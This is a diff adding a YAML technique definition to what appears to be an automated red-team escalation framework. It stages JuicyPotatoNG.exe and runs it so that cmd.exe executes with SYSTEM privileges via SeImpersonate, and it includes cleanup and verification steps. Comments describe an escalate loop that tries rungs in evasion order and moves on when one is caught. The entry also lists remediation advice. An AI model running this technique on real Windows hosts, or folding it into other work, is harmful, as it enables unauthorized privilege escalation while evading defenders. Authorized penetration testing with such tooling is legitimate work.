@@ -1,0 +1,44 @@
+# SeImpersonate → SYSTEM via JuicyPotatoNG (native .exe rung)
+#
+# Part of the SeImpersonate → SYSTEM delivery ladder (family: seimpersonate).
+# The escalate loop fires ladder rungs in evasion-posture order and climbs to
+# the next family member when one is caught. This rung: JuicyPotatoNG.exe staged to
+# disk, invoked by cmd.
+#
+# JuicyPotatoNG (DCOM, C++) — the modern JuicyPotato successor.
+technique: T1134.002
+name: SeImpersonate → SYSTEM (JuicyPotatoNG)
+tactic: [privilege-escalation]
+platform: [windows]
+key: seimpersonate:juicypotatong
+family: seimpersonate
+delivery: native-exe
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: moderate
+detect:
+  privilege: [SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege]
+execute:
+  command: |-
+    {{stage}}\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
+  stages:
+    - name: JuicyPotatoNG
+      as: '{{stage}}\JuicyPotatoNG.exe'
+cleanup:
+  command: |-
+    del {{stage}}\JuicyPotatoNG.exe
+verify:
+  success: "NT AUTHORITY"
+report:
+  vector_type: seimpersonate
+  description: >
+    JuicyPotatoNG (DCOM, C++) — the modern JuicyPotato successor.
+    Staged as a native .exe under the operator's Windows staging dir; the
+    escalate loop pushes it from the arsenal.
+  remediation: >
+    Don't grant SeImpersonate to non-tier-0 accounts. Service accounts that
+    need it (IIS worker, MSSQL service) should be isolated and monitored;
+    Credential Guard + protected process light for tier-0 processes helps
+    contain the blast radius.
+  refs: [T1134.002, JuicyPotatoNG]
